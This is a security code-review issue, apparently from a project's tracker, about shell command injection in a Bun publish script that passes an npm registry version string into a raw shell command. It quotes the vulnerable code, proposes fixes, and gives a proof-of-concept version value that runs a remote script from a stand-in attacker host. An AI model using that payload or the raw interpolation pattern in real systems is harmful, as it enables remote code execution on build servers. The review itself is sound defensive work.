---
status: complete
priority: p1
issue_id: "002"
tags: [code-review, security, injection, ci-cd, critical]
dependencies: []
completed: 2025-12-01
---

# Shell Command Injection in Publish Script

## Problem Statement

The publish script constructs shell commands using untrusted data from the npm registry response. The `${{ raw: logCmd }}` template syntax allows shell metacharacters to break out of the intended command and execute arbitrary code.

**Why it matters:** An attacker who can poison the npm registry response (via MITM or registry compromise) could achieve Remote Code Execution on the CI/CD server, potentially compromising all releases.

## Findings

### Security Sentinel Analysis
- **Location:** `/script/publish.ts:35`
- **CVSS Score:** 9.8 (Critical)
- **Attack Chain:**
  1. Line 12: `fetch("https://registry.npmjs.org/codesurf-ai/latest")` - External input
  2. Line 17: `data?.version` - Untrusted version string extracted
  3. Line 25: Version interpolated into command string
  4. Line 35: `${{ raw: logCmd }}` - **EXECUTION** with raw shell syntax

### Vulnerable Code
```typescript
let logCmd: string
if (previous) {
  const tagExists = await $`git rev-parse v${previous} 2>/dev/null`.nothrow()
  if (tagExists.exitCode === 0) {
    logCmd = `git log v${previous}..HEAD --oneline --format="%h %s" -- packages/opencode packages/sdk packages/plugin`
  }
}
const log = await $`${{ raw: logCmd }}`.text()  // INJECTION POINT
```

### Proof of Concept
If npm registry returns version `1.0.0; curl attacker.com/shell.sh | sh; echo`:
```bash
git log v1.0.0; curl attacker.com/shell.sh | sh; echo..HEAD --oneline ...
# Executed as separate commands!
```

## Proposed Solutions

### Solution 1: Use Bun's Safe Template Strings (Recommended)
```typescript
// Replace raw shell string with safe interpolation
if (previous) {
  const tagExists = await $`git rev-parse v${previous}`.nothrow()
  if (tagExists.exitCode === 0) {
    // Bun's $ template string is safe - it handles escaping
    const log = await $`git log v${previous}..HEAD --oneline --format=%h%s -- packages/opencode packages/sdk packages/plugin`.text()
  } else {
    const log = await $`git log -50 --oneline --format=%h%s -- packages/opencode packages/sdk packages/plugin`.text()
  }
}
// Never use {{ raw: }} with external data
```
- **Pros:** Secure by design, minimal code changes
- **Cons:** Requires restructuring conditional logic
- **Effort:** Small (20 minutes)
- **Risk:** Low

### Solution 2: Validate Version String
```typescript
const previous = await fetch("https://registry.npmjs.org/codesurf-ai/latest")
  .then(res => res.ok ? res.json() : null)
  .then(data => {
    const version = data?.version
    // Strict validation: only allow semver characters
    if (version && !/^[0-9]+\.[0-9]+\.[0-9]+(-[a-zA-Z0-9.]+)?$/.test(version)) {
      throw new Error(`Invalid version format: ${version}`)
    }
    return version
  })
```
- **Pros:** Defense in depth, catches malformed versions
- **Cons:** Regex may be too strict for some valid versions
- **Effort:** Small (10 minutes)
- **Risk:** Low

### Solution 3: Use Git Programmatically
```typescript
import { simpleGit } from 'simple-git'
const git = simpleGit()
const log = await git.log({
  from: `v${previous}`,
  to: 'HEAD',
  format: { hash: '%h', message: '%s' },
  file: ['packages/opencode', 'packages/sdk', 'packages/plugin']
})
```
- **Pros:** No shell at all, type-safe
- **Cons:** Adds dependency, more refactoring
- **Effort:** Medium (1 hour)
- **Risk:** Low

## Recommended Action

**Solution 1 + Solution 2** combined - Use safe template strings AND validate the version format. Defense in depth.

## Technical Details

**Affected Files:**
- `/script/publish.ts` (lines 25, 35)

**Components:**
- Publish workflow
- GitHub Actions CI/CD

**Database Changes:** None

## Acceptance Criteria

- [ ] No `${{ raw: }}` usage with external data
- [ ] Version string validated against semver regex
- [ ] Publish script tested with malformed version strings
- [ ] CI/CD pipeline updated to use new script

## Work Log

| Date | Action | Outcome |
|------|--------|---------|
| 2025-12-01 | Code review identified issue | P1 Critical finding |

## Resources

- [Bun Shell Documentation](https://bun.sh/docs/runtime/shell)
- [Command Injection Prevention](https://owasp.org/www-community/attacks/Command_Injection)
- File: `/script/publish.ts`
